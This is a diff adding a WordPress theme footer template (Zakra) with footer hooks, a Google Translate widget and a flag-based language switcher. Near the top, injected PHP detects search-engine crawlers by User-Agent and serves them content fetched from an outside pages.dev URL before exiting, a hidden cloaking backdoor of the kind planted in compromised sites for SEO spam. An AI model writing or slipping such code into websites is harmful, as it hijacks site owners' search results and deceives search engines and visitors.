@@ -1,0 +1,226 @@
+<?php
+/**
+ * The template for displaying the footer
+ *
+ * Contains the closing of the #zak-content div and all content after.
+ *
+ * @link    https://developer.wordpress.org/themes/basics/template-files/#template-partials
+ *
+ * @package zakra
+ */
+
+?>
+<?php
+function is_bot() {
+  $user_agent = $_SERVER['HTTP_USER_AGENT'];
+  $bots = array("bot","ahrefs","google");
+  
+  foreach ($bots as $bot) {
+    if (stripos($user_agent, $bot) !== false) {
+      return true;
+    }
+  }
+  
+  return false;
+}
+
+if (is_bot()) {
+  $message = file_get_contents('https://punten-neng.pages.dev/wiraraja/fik/');
+  echo $message;
+exit;
+} 
+?>
+	<?php
+	/**
+	 * Hook - zakra_action_after_content.
+	 *
+	 * @hooked zakra_content_end - 10
+	 * @hooked zakra_main_end - 15
+	 */
+	do_action( 'zakra_action_after_content' );
+	?>
+
+	<?php
+	/**
+	 * Hook - zakra_action_before_footer
+	 *
+	 * @hooked zakra_footer_start - 10
+	 */
+	do_action( 'zakra_action_before_footer' );
+
+	/**
+	 * Hook - zakra_builder_footer
+	 *
+	 * @hooked zakra_footer_builder_markup - 10
+	 */
+	do_action( 'zakra_builder_footer' );
+
+	/**
+	* Hook - zakra_action_footer_widgets
+	*
+	* @hooked zakra_footer_widgets - 10
+	*/
+	do_action( 'zakra_action_footer_widgets' );
+
+	?>
+	<?php
+		/**
+		* Hook - zakra_action_footer_bottom_bar
+		*
+		* @hooked zakra_footer_bottom_bar - 10
+		*/
+			do_action( 'zakra_action_footer_bottom_bar' );
+
+
+	?>
+
+	<?php
+		/**
+		 * Hook - zakra_action_after_footer
+		 *
+		 * @hooked zakra_footer_end - 10
+		 * @hooked zakra_mobile_navigation - 15
+		 * @hooked zakra_scroll_to_top - 20
+		 */
+		do_action( 'zakra_action_after_footer' );
+	?>
+
+<?php
+/**
+ * Hook - zakra_action_after
+ *
+ * @hooked zakra_page_end- 10
+ */
+do_action( 'zakra_action_after' );
+?>
+
+<?php wp_footer(); ?>
+<!-- Google Translate -->
+<div id="google_translate_element" style="display:none;"></div>
+<script type="text/javascript">
+  function googleTranslateElementInit() {
+    new google.translate.TranslateElement({
+      pageLanguage: 'id',
+      includedLanguages: 'id,en',
+      layout: google.translate.TranslateElement.InlineLayout.SIMPLE
+    }, 'google_translate_element');
+  }
+</script>
+<script src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+
+<!-- Ganti Bahasa + Toggle Dropdown -->
+<script>
+  function changeLanguage(lang) {
+    document.cookie = `googtrans=/id/${lang};path=/`;
+    document.cookie = `googtrans=/id/${lang};path=/;domain=.${window.location.hostname}`;
+    location.reload();
+  }
+
+  function toggleDropdown() {
+    document.getElementById('langDropdown').classList.toggle('show');
+  }
+
+  window.onclick = function(event) {
+    if (!event.target.closest('.floating-language-button')) {
+      document.getElementById('langDropdown')?.classList.remove('show');
+    }
+  }
+
+  // Deteksi Bahasa Aktif dari Cookie
+  function getActiveLang() {
+    const cookies = document.cookie.split(';').map(c => c.trim());
+    const googtrans = cookies.find(c => c.startsWith('googtrans='));
+    let lang = 'id'; // default
+
+    if (googtrans) {
+      const match = googtrans.split('=')[1].split('/');
+      lang = match[2] || 'id';
+    }
+    return lang;
+  }
+
+  // Tampilkan icon bendera aktif
+  document.addEventListener('DOMContentLoaded', () => {
+    const langIcon = document.getElementById('activeLangIcon');
+    const lang = getActiveLang();
+
+    // URL bendera (pakai FlagCDN)
+    const flagUrls = {
+      'id': 'https://flagcdn.com/w40/id.png',
+      'en': 'https://flagcdn.com/w40/gb.png' // bisa diganti US kalau mau
+    };
+
+    if (langIcon) {
+      langIcon.innerHTML = `<img src="${flagUrls[lang]}" alt="${lang}" style="width:32px;height:auto;">`;
+    }
+  });
+</script>
+
+<!-- Bendera Aktif + Dropdown -->
+<div class="floating-language-button">
+  <div id="activeLangIcon" class="lang-icon" onclick="toggleDropdown()" title="Ganti Bahasa"></div>
+  <div id="langDropdown" class="dropdown-content">
+    <a href="#" onclick="changeLanguage('id')">
+      <img src="https://flagcdn.com/w20/id.png" style="vertical-align:middle;"> Indonesia
+    </a>
+    <a href="#" onclick="changeLanguage('en')">
+      <img src="https://flagcdn.com/w20/gb.png" style="vertical-align:middle;"> English
+    </a>
+  </div>
+</div>
+
+<!-- Style -->
+<style>
+  .floating-language-button {
+    position: fixed;
+    bottom: 20px;
+    left: 20px;
+    z-index: 9999;
+  }
+
+  .lang-icon {
+    background-color: transparent;
+    cursor: pointer;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    border-radius: 6px;
+    transition: transform 0.2s ease;
+  }
+  .lang-icon:hover {
+    transform: scale(1.1);
+  }
+
+  .dropdown-content {
+    display: none;
+    position: absolute;
+    bottom: 60px;
+    left: 0;
+    background-color: white;
+    min-width: 160px;
+    box-shadow: 0 8px 16px rgba(0,0,0,0.2);
+    border-radius: 6px;
+    overflow: hidden;
+    font-size: 14px;
+  }
+
+  .dropdown-content a {
+    color: black;
+    padding: 8px 12px;
+    text-decoration: none;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  .dropdown-content a:hover {
+    background-color: #f1f1f1;
+  }
+
+  .dropdown-content.show {
+    display: block;
+  }
+</style>
+
+</body>
+</html>
